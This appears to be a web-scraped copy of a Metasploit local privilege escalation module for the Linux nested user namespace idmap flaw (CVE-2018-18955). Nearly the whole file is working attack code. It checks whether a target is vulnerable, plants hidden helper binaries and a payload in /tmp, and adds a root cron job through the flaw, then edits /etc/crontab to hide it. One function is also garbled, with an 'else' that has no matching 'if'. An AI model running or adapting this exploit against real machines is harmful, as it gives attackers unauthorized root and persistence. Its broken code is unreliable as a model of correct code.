# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Linux Nested User Namespace idmap Limit Local Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in Linux kernels 4.15.0 to 4.18.18,
        and 4.19.0 to 4.19.1, where broken uid/gid mappings between nested user
        namespaces and kernel uid/gid mappings allow elevation to root
        (CVE-2018-18955).

        The target system must have unprivileged user namespaces enabled and
        the newuidmap and newgidmap helpers installed (from uidmap package).

        This module has been tested successfully on:

        Fedora Workstation 28 kernel 4.16.3-301.fc28.x86_64;
        Kubuntu 18.04 LTS kernel 4.15.0-20-generic (x86_64);
        Linux Mint 19 kernel 4.15.0-20-generic (x86_64);
        Ubuntu Linux 18.04.1 LTS kernel 4.15.0-20-generic (x86_64).
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jann Horn&#039;, # Discovery and exploit
          &#039;bcoles&#039;     # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Nov 15 2018&#039;,
      &#039;Platform&#039;       => [&#039;linux&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;Privileged&#039;     => true,
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;105941&#039;],
          [&#039;CVE&#039;, &#039;2018-18955&#039;],
          [&#039;EDB&#039;, &#039;45886&#039;],
          [&#039;PACKETSTORM&#039;, &#039;150381&#039;],
          [&#039;URL&#039;, &#039;https://bugs.chromium.org/p/project-zero/issues/detail?id=1712&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bcoles/kernel-exploits/tree/master/CVE-2018-18955&#039;],
          [&#039;URL&#039;, &#039;https://lwn.net/Articles/532593/&#039;],
          [&#039;URL&#039;, &#039;https://bugs.launchpad.net/bugs/1801924&#039;],
          [&#039;URL&#039;, &#039;https://people.canonical.com/~ubuntu-security/cve/CVE-2018-18955&#039;],
          [&#039;URL&#039;, &#039;https://security-tracker.debian.org/tracker/CVE-2018-18955&#039;],
          [&#039;URL&#039;, &#039;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d2f007dbe7e4c9583eea6eb04d60001e85c6f1bd&#039;],
          [&#039;URL&#039;, &#039;https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.18.19&#039;],
          [&#039;URL&#039;, &#039;https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.19.2&#039;]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DefaultOptions&#039; =>
        {
          &#039;AppendExit&#039;       => true,
          &#039;PrependSetresuid&#039; => true,
          &#039;PrependSetreuid&#039;  => true,
          &#039;PrependSetuid&#039;    => true,
          &#039;PrependFork&#039;      => true,
          &#039;WfsDelay&#039;         => 60,
        },
      &#039;Notes&#039; =>
        {
          &#039;AKA&#039; => [&#039;subuid_shell.c&#039;]
        }
      ))
    register_options [
      OptEnum.new(&#039;COMPILE&#039;, [true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w[Auto True False]])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end
    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error output
    end

    register_file_for_cleanup path
    chmod path, 0755
  end

  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;cve-2018-18955&#039;, file)
  end

  def live_compile?
    return false unless datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)

    if has_gcc?
      vprint_good &#039;gcc is installed&#039;
      return true
    end

    unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
      fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
    end
  end

  def check
    unless userns_enabled?
      vprint_error &#039;Unprivileged user namespaces are not permitted&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;Unprivileged user namespaces are permitted&#039;

    [&#039;/usr/bin/newuidmap&#039;, &#039;/usr/bin/newgidmap&#039;].each do |path|
      unless setuid? path
        vprint_error "#{path} is not set-uid"
        return CheckCode::Safe
      end
      vprint_good "#{path} is set-uid"
    end

    # Patched in 4.18.19 and 4.19.2
    release = kernel_release
    v = Gem::Version.new release.split(&#039;-&#039;).first
    if v < Gem::Version.new(&#039;4.15&#039;) ||
       v >= Gem::Version.new(&#039;4.19.2&#039;) ||
       (v >= Gem::Version.new(&#039;4.18.19&#039;) && v < Gem::Version.new(&#039;4.19&#039;))
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    CheckCode::Appears
  end

  def on_new_session(session)
      session.core.use &#039;stdapi&#039; unless session.ext.aliases.include? &#039;stdapi&#039;
      session.sys.process.execute &#039;/bin/sh&#039;, "-c \"/bin/sed -i &#039;\$ d&#039; /etc/crontab\""
    else
      session.shell_command("/bin/sed -i &#039;\$ d&#039; /etc/crontab")
    end
  ensure
    super
  end

  def exploit
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override.&#039;
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload executables
    subuid_shell_name = ".#{rand_text_alphanumeric 5..10}"
    subuid_shell_path = "#{base_dir}/#{subuid_shell_name}"
    subshell_name = ".#{rand_text_alphanumeric 5..10}"
    subshell_path = "#{base_dir}/#{subshell_name}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile subuid_shell_path, exploit_data(&#039;subuid_shell.c&#039;)
      upload_and_compile subshell_path, exploit_data(&#039;subshell.c&#039;)
    else
      upload_and_chmodx subuid_shell_path, exploit_data(&#039;subuid_shell.out&#039;)
      upload_and_chmodx subshell_path, exploit_data(&#039;subshell.out&#039;)
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric 5..10}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit
    print_status &#039;Adding cron job...&#039;
    output = cmd_exec "echo \"echo &#039;* * * * * root #{payload_path}&#039; >> /etc/crontab\" | #{subuid_shell_path} #{subshell_path} "
    output.each_line { |line| vprint_status line.chomp }

    crontab = read_file &#039;/etc/crontab&#039;
    unless crontab.include? payload_path
      fail_with Failure::Unknown, &#039;Failed to add cronjob&#039;
    end

    print_good &#039;Success. Waiting for job to run (may take a minute)...&#039;
  end
end

